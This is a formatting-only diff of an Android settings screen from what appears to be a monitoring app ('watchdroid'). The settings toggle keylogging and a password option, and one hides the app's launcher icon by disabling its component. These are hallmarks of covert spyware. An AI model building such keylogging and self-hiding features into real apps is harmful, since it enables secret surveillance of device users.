@@ -40,14 +40,13 @@ public class Settings extends PreferenceFragment {
         boot.setOnPreferenceChangeListener(new Preference.OnPreferenceChangeListener() {
             public boolean onPreferenceChange(Preference preference, Object newValue) {
                 Boolean cbv = (Boolean) newValue;
-                    if(cbv) {
-                        editor.putBoolean("keylogging", true);
-                        editor.commit();
-                    }
-                    else {
-                        editor.putBoolean("keylogging", false   );
-                        editor.commit();
-                    }
+                if (cbv) {
+                    editor.putBoolean("keylogging", true);
+                    editor.commit();
+                } else {
+                    editor.putBoolean("keylogging", false);
+                    editor.commit();
+                }
                 return true;
             }
         });
@@ -57,12 +56,11 @@ public class Settings extends PreferenceFragment {
         passonoff.setOnPreferenceChangeListener(new Preference.OnPreferenceChangeListener() {
             public boolean onPreferenceChange(Preference preference, Object newValue) {
                 Boolean cbv = (Boolean) newValue;
-                if(cbv) {
+                if (cbv) {
                     editor.putBoolean("keypassonoff", true);
                     editor.commit();
-                }
-                else {
-                    editor.putBoolean("keypassonoff", false   );
+                } else {
+                    editor.putBoolean("keypassonoff", false);
                     editor.commit();
                 }
                 return true;
@@ -73,16 +71,15 @@ public class Settings extends PreferenceFragment {
         iconhide.setOnPreferenceChangeListener(new Preference.OnPreferenceChangeListener() {
             public boolean onPreferenceChange(Preference preference, Object newValue) {
                 Boolean cbv = (Boolean) newValue;
-                if(cbv) {
+                if (cbv) {
                     editor.putBoolean("keyhideicon", true);
                     editor.commit();
                     //hide
                     PackageManager p = getActivity().getPackageManager();
-                    ComponentName componentName= new ComponentName(getActivity(), com.watchdroid.SplashScreen.class);
-                    p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                    ComponentName componentName = new ComponentName(getActivity(), com.watchdroid.SplashScreen.class);
+                    p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
-                }
-                else {
+                } else {
                     editor.putBoolean("keyhideicon", false);
                     editor.commit();
                     PackageManager p = getActivity().getPackageManager();
